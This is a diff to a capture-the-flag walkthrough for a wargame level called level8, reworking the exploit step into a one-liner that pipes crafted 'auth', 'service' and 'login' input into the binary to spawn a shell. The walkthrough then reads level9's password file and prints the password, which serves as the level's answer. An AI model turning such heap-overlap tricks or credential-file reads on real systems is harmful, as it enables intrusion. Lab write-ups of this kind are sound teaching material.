@@ -28,20 +28,13 @@
    Conclusion: If service is ≥16 bytes long, auth[32] will read 
    into service buffer and find non-zero data!
 
-5. Execute the exploit:
-   ./level8
+5. Execute the exploit and get the flag:
+   (echo "auth "; echo "serviceBBBBBBBBBBBBBBBB"; echo "login"; cat) | ./level8
    
-   Enter these commands:
-   auth AAAA
-   service BBBBBBBBBBBBBBBB
-   login
-   
-   Shell spawned!
-
-6. Get the flag:
+   Once shell spawns, type:
    cat /home/user/level9/.pass
    
    Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
 
-7. Exit and login as level9:
+6. Exit and login as level9:
    su level9
